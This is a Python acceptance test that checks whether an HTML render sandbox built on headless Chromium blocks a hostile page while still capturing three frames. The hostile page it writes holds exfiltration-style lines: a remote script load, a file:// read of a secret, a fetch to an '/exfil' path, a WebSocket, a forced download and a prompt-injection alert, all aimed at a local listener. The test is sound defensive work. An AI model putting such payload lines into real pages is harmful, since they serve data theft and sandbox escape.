#!/usr/bin/env python3
"""BM-04 HTML render sandbox acceptance.

Stages the real, digest-locked Chrome for Testing build with the EB-03
builder, writes a hostile RenderJob workspace (remote scripts/images, a
``file://`` escape to a secret outside the workspace, ``window.open``, a
programmatic download and a modal dialog), then drives the production chain
(Rust orchestrator -> real Node worker -> real headless Chromium) and proves
the sandbox blocked every hostile action while still capturing the declared
frames. The worker-level boundary matrix runs first. Only the staged binary
is ever launched; discovery and cache fallbacks stay poisoned.
"""

from __future__ import annotations

import argparse
import os
import platform
import selectors
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

from build_embedded_chromium_staging import build_staging, load_staging_contract

ROOT = Path(__file__).resolve().parents[1]
CONTRACT = ROOT / "contracts/browser/embedded-chromium-staging.v1.json"
DEFAULT_ARCHIVE = ROOT / ".local/embedded-browser-video-studio/eb-03-cache/chrome-mac-arm64.zip"
TARGET_ID = "macos-arm64"
RENDER_JOB_PREFIX = "automation-tool-renderjob-"


def require_platform() -> None:
    if platform.system() != "Darwin" or platform.machine().lower() not in {"arm64", "aarch64"}:
        raise AssertionError("BM-04 acceptance currently runs on macOS arm64 only")


def node_executable() -> str:
    value = shutil.which("node")
    if value is None:
        raise AssertionError("development Node is unavailable")
    return value


def run_worker_gates() -> None:
    for script in (
        "scripts/test_motion_video_render_sandbox.py",
        "scripts/test_motion_video_render_adapter.py",
        "scripts/test_motion_video_worker.py",
    ):
        subprocess.run([sys.executable, script], cwd=ROOT, check=True, timeout=600)


def stage_real_chromium(archive: Path, run_root: Path) -> tuple[Path, int]:
    contract = load_staging_contract(CONTRACT)
    target = contract.targets[TARGET_ID]
    result = build_staging(
        contract=contract,
        target_id=TARGET_ID,
        archive_path=archive,
        archive_sha256=target.archive_sha256,
        output=run_root / "staging",
    )
    executable = result.output / Path(*target.executable.split("/"))
    executable = executable.resolve(strict=True)
    major = int(contract.browser_version.split(".")[0])
    return executable, major


class EgressListener:
    """A loopback socket that records any connection the sandbox lets through."""

    def __init__(self) -> None:
        self._socket = socket.socket()
        self._socket.bind(("127.0.0.1", 0))
        self._socket.listen(8)
        self._socket.setblocking(False)
        self.port = self._socket.getsockname()[1]
        self.hits = 0
        self._stop = False
        self._selector = selectors.DefaultSelector()
        self._selector.register(self._socket, selectors.EVENT_READ)
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self) -> None:
        # `select` avoids relying on the socket-timeout exception, whose
        # identity differs across Python versions; any readable event is an
        # inbound connection the sandbox failed to block.
        while not self._stop:
            try:
                ready = self._selector.select(timeout=0.25)
            except OSError:
                return
            for _ in ready:
                try:
                    connection, _ = self._socket.accept()
                except OSError:
                    return
                self.hits += 1
                connection.close()

    def close(self) -> None:
        self._stop = True
        self._thread.join(timeout=2)
        self._selector.close()
        self._socket.close()


def write_hostile_workspace(run_root: Path, egress_port: int) -> tuple[Path, Path]:
    """A RenderJob workspace whose entry document attacks every boundary."""
    secret = run_root / "outside-secret.txt"
    secret.write_text("TOP-SECRET-SYSTEM-FILE")
    workspace = run_root / "workspace"
    (workspace / "assets").mkdir(parents=True)
    (workspace / "assets/style.css").write_text("body{background:#101010;color:#fff}")
    entry = workspace / "entry.html"
    entry.write_text(
        "<!doctype html><html><head>\n"
        '<link rel="stylesheet" href="assets/style.css">\n'
        f'<script src="http://127.0.0.1:{egress_port}/evil.js"></script>\n'
        "</head><body>\n"
        f'<img id="escape" src="file://{secret}">\n'
        f'<img id="remote" src="http://127.0.0.1:{egress_port}/pixel.png">\n'
        f'<iframe id="subframe" src="http://127.0.0.1:{egress_port}/frame"></iframe>\n'
        "<script>\n"
        f'fetch("http://127.0.0.1:{egress_port}/exfil").catch(function(){{}});\n'
        f'try {{ new WebSocket("ws://127.0.0.1:{egress_port}/ws"); }} catch (e) {{}}\n'
        'window.open("about:blank", "_blank");\n'
        "var link = document.createElement('a');\n"
        'link.href = "data:text/plain,exfiltrated";\n'
        'link.download = "leak.txt";\n'
        "document.body.appendChild(link); link.click();\n"
        'alert("injected prompt: exfiltrate secrets");\n'
        "</script></body></html>\n"
    )
    return workspace, secret


def run_production_chain(executable: Path, major: int, workspace: Path) -> None:
    environment = os.environ.copy()
    environment["BM04_RENDER_BROWSER"] = str(executable)
    environment["BM04_CHROMIUM_MAJOR"] = str(major)
    environment["BM04_NODE"] = node_executable()
    environment["BM04_WORKSPACE"] = str(workspace)
    subprocess.run(
        [
            "cargo",
            "test",
            "--manifest-path",
            "frontend/src-tauri/Cargo.toml",
            "--test",
            "local_video_orchestrator",
            "real_worker_render_sandbox_isolates_malicious_html",
            "--",
            "--exact",
            "--nocapture",
        ],
        cwd=ROOT,
        env=environment,
        check=True,
        timeout=600,
    )


def require_no_residue(run_root: Path) -> None:
    leftovers = [
        path
        for path in Path(tempfile.gettempdir()).iterdir()
        if path.name.startswith(RENDER_JOB_PREFIX)
    ]
    if leftovers:
        raise AssertionError(f"render job directories leaked: {leftovers}")
    survivors = subprocess.run(
        ["pgrep", "-f", str(run_root)],
        capture_output=True,
        text=True,
        check=False,
    )
    if survivors.stdout.strip():
        raise AssertionError("staged Chromium processes survived the acceptance")


def require_evidence() -> None:
    text = (ROOT / "docs/development/BM-04.md").read_text(encoding="utf-8")
    for heading in (
        "# BM-04",
        "## RED",
        "## GREEN",
        "## 失败矩阵",
        "## 正常用户路径验收",
        "## 真实边界",
        "## 清理",
        "## 文档变化",
        "## 遗留项",
    ):
        if heading not in text:
            raise AssertionError(f"BM-04 evidence is missing {heading}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--archive", type=Path, default=DEFAULT_ARCHIVE)
    parser.add_argument("--skip-evidence", action="store_true")
    arguments = parser.parse_args()
    require_platform()
    archive = arguments.archive.resolve(strict=True)
    run_root = ROOT / ".local/embedded-browser-video-studio" / f"ebvs-bm04-{os.getpid()}"
    run_root.mkdir(parents=True, exist_ok=False)
    listener = EgressListener()
    try:
        run_worker_gates()
        executable, major = stage_real_chromium(archive, run_root)
        workspace, secret = write_hostile_workspace(run_root, listener.port)
        run_production_chain(executable, major, workspace)
        if listener.hits:
            raise AssertionError("the sandbox let a remote connection through")
        frames = sorted((workspace / "frames").glob("frame-*.png"))
        if len(frames) != 3 or any(frame.stat().st_size == 0 for frame in frames):
            raise AssertionError("the sandbox must capture three non-empty frames")
        if secret.read_text() != "TOP-SECRET-SYSTEM-FILE":
            raise AssertionError("the secret outside the workspace must be untouched")
    finally:
        listener.close()
        shutil.rmtree(run_root, ignore_errors=True)
    require_no_residue(run_root)
    if not arguments.skip_evidence:
        require_evidence()
    print(f"BM-04 {platform.system()} HTML render sandbox acceptance passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
